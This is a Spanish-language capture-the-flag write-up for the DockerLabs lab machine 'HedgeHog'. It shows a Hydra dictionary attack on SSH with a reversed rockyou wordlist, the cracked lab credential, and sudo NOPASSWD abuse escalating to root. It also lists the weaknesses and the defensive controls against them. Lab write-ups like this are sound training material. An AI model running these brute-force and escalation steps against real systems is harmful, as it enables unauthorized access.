# DockerLabs — Writeup: HedgeHog (Muy Fácil)

> Laboratorio/CTF autorizado de DockerLabs. Este writeup documenta únicamente la resolución de la máquina **HedgeHog**, catalogada como **Muy Fácil**.

Esta máquina presenta una cadena deliberadamente sencilla orientada a practicar fundamentos:

- Preparación y manipulación básica de una wordlist.
- Ataque de diccionario contra SSH dentro de un entorno CTF.
- Acceso inicial mediante credenciales válidas.
- Enumeración de privilegios con `sudo -l`.
- Movimiento de usuario mediante una regla `NOPASSWD` insegura.
- Escalada final a `root`.

---

## 1. Preparación de la wordlist

Comenzamos copiando la wordlist `rockyou.txt` al directorio de trabajo:

```bash
cp /usr/share/wordlists/rockyou.txt .
```

A continuación invertimos el orden de sus líneas y guardamos el resultado en `backpass.txt`:

```bash
tac rockyou.txt >> backpass.txt
```

Finalmente eliminamos los espacios presentes en el archivo:

```bash
sed -i 's/ //g' backpass.txt
```

El objetivo de estos pasos es preparar la lista que utilizaremos posteriormente durante la auditoría de la contraseña del usuario SSH del laboratorio.

> **Nota:** `tac` invierte el orden de las líneas del archivo; no invierte los caracteres de cada contraseña.

---

## 2. Auditoría de credenciales SSH

Utilizamos Hydra contra el servicio SSH del objetivo, indicando el usuario `tails` y la wordlist preparada anteriormente:

```bash
hydra -l tails -P /home/kali/backpass.txt ssh://172.17.0.2
```

Hydra encuentra una credencial válida para el usuario:

```text
login: tails
password: 3117548331
```

Con esto obtenemos las credenciales necesarias para realizar el acceso inicial al sistema.

---

## 3. Acceso inicial mediante SSH

Nos conectamos al objetivo utilizando las credenciales encontradas:

```bash
ssh tails@172.17.0.2
```

Tras aceptar la fingerprint del host e introducir la contraseña obtenemos una shell como el usuario `tails`.

Podemos verificar el acceso con:

```bash
whoami
```

---

## 4. Enumeración de privilegios con sudo

Una vez dentro del sistema revisamos los privilegios sudo disponibles:

```bash
sudo -l
```

El resultado muestra una configuración especialmente insegura:

```text
User tails may run the following commands on ...:
    (sonic) NOPASSWD: ALL
```

Esto significa que `tails` puede ejecutar cualquier comando como el usuario `sonic` sin necesidad de proporcionar una contraseña.

Durante la enumeración también observamos los directorios personales disponibles:

```bash
cd ..
ls
```

Entre ellos aparece:

```text
sonic  tails  ubuntu
```

El intento de acceder directamente al directorio de `sonic` falla por falta de permisos, lo que confirma que necesitamos utilizar los privilegios concedidos mediante sudo.

---

## 5. Movimiento al usuario sonic

Aprovechamos la regla `NOPASSWD` para iniciar una shell como `sonic`:

```bash
sudo -u sonic /bin/bash
```

Verificamos el cambio de usuario:

```bash
whoami
```

Resultado:

```text
sonic
```

En este punto hemos pasado de `tails` a `sonic` aprovechando exclusivamente una mala configuración de sudo.

---

## 6. Escalada final a root

Desde la sesión de `sonic` ejecutamos:

```bash
sudo -u root /bin/bash
```

El prompt cambia a una shell de `root`, completando la escalada de privilegios.

Para verificarlo puede utilizarse:

```bash
whoami
```

Resultado esperado en la sesión privilegiada:

```text
root
```

---

## 7. Resumen de la cadena de ataque

```text
Preparación de wordlist
        ↓
rockyou.txt
        ↓
tac + limpieza con sed
        ↓
Hydra contra SSH
        ↓
Credenciales de tails
        ↓
SSH como tails
        ↓
sudo -l
        ↓
(sonic) NOPASSWD: ALL
        ↓
sudo -u sonic /bin/bash
        ↓
Usuario sonic
        ↓
sudo -u root /bin/bash
        ↓
ROOT
```

---

## 8. Debilidades observadas

| Debilidad / mala configuración | Impacto |
|---|---|
| Contraseña SSH presente en una wordlist conocida | Permite obtener acceso mediante un ataque de diccionario dentro del laboratorio |
| Regla sudo `(sonic) NOPASSWD: ALL` para `tails` | Permite ejecutar cualquier comando como `sonic` sin contraseña |
| Cadena de privilegios sudo excesivamente permisiva | Permite terminar alcanzando una shell de `root` |

---

## 9. Conclusión

**HedgeHog** es una máquina intencionadamente básica. Su valor no está en representar por completo un entorno moderno de producción, sino en permitir practicar de forma aislada varios conceptos fundamentales: auditoría de contraseñas, acceso SSH, lectura de reglas sudo y abuso de permisos `NOPASSWD`.

En sistemas actuales bien configurados, un ataque de diccionario masivo contra SSH puede verse limitado por controles como autenticación por clave, MFA, políticas de contraseña, rate limiting, bloqueos o sistemas de detección. Precisamente por eso este tipo de laboratorio debe entenderse como una práctica controlada de fundamentos y no como una representación exacta de una infraestructura moderna.

La lección principal de la máquina es sencilla:

```text
Credenciales débiles + permisos sudo excesivos = compromiso completo del sistema
```
